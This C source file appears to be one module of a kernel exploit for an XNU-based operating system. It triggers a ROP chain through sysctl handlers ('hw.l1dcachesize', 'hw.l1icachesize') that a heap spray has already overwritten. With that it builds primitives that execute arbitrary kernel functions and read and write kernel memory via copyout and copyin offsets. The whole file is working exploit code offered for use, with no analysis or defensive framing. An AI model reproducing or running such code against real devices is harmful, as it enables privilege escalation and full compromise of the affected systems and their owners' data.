#include "rwx.h"
#include "offsets.h"
#include "heap_spray.h"

#include <stdio.h>
#include <sys/types.h>
#include <sys/sysctl.h>

#define SYSCTL_PREPARE_ROP												("hw.l1dcachesize")
#define SYSCTL_EXECUTE_ROP												("hw.l1icachesize")

/*
 * Function name: 	rwx_trigger_handler
 * Description:		Calls the overwritten sysctl to execute the ROP chain.
 * Returns:			kern_return_t.
 */

static kern_return_t rwx_trigger_handler()  {
	kern_return_t ret = KERN_SUCCESS;
	unsigned long oldp = 0;
	size_t olds = 8;

	if (sysctlbyname(SYSCTL_PREPARE_ROP, &oldp, &olds, NULL, 0))
	{
		printf("[ERROR]:  preparing ROP using %s", SYSCTL_PREPARE_ROP);
		ret = KERN_ABORTED;
		goto cleanup;
	}
	else if(0 != olds) {
		printf("[ERROR]: %s returned a normal size. seems like our sysctl handler wasn't installed.", SYSCTL_PREPARE_ROP);
		ret = KERN_ABORTED;
		goto cleanup;
	}

	olds = 8;

	if (sysctlbyname(SYSCTL_EXECUTE_ROP, &oldp, &olds, NULL, 0))
	{
		printf("[ERROR]:  preparing ROP using %s", SYSCTL_EXECUTE_ROP);
		ret = KERN_ABORTED;
	}
	else if (0 != olds) {
		printf("[ERROR]: %s returned a normal size. seems like our sysctl handler wasn't installed.", SYSCTL_EXECUTE_ROP);
		ret = KERN_ABORTED;
		goto cleanup;
	}

cleanup:
	return ret;
}

/*
 * Function name: 	rwx_execute
 * Description:		Executes a kernel function with controlled parameters.
 * Returns:			kern_return_t.
 */

kern_return_t rwx_execute(uint64_t func_addr, unsigned long arg0, unsigned long arg1, unsigned long arg2) {
	kern_return_t ret = KERN_SUCCESS;
	heap_spray_prepare_buffer_for_rop(func_addr, 
		arg0,
		arg1,
		arg2);

	ret = rwx_trigger_handler();
	if (KERN_SUCCESS != ret)
	{
		goto cleanup;
	}
	

cleanup:
	return ret;

}

/*
 * Function name: 	rwx_read
 * Description:		Reads from a kernel address 'addr' into 'value', 'length' bytes.
 * Returns:			kern_return_t.
 */

kern_return_t rwx_read(uint64_t addr, void * value, size_t length) {
	kern_return_t ret = KERN_SUCCESS;

	ret = rwx_execute(offsets_get_kernel_base() + OFFSET(copyout), (unsigned long)addr, (unsigned long)(value), length);
	if (KERN_SUCCESS != ret)
	{
		goto cleanup;
	}
	

cleanup:
	return ret;

}

/*
 * Function name: 	rwx_write
 * Description:		Writes to a kernel address 'addr' from buffer 'value', 'length' bytes.
 * Returns:			kern_return_t.
 */

kern_return_t rwx_write(uint64_t addr, void * value, size_t length) { 
	kern_return_t ret = KERN_SUCCESS;

	ret = rwx_execute(offsets_get_kernel_base() + OFFSET(copyin), (unsigned long)value, (unsigned long)addr, length);
	if (KERN_SUCCESS != ret)
	{
		goto cleanup;
	}

cleanup:
	return ret;

}
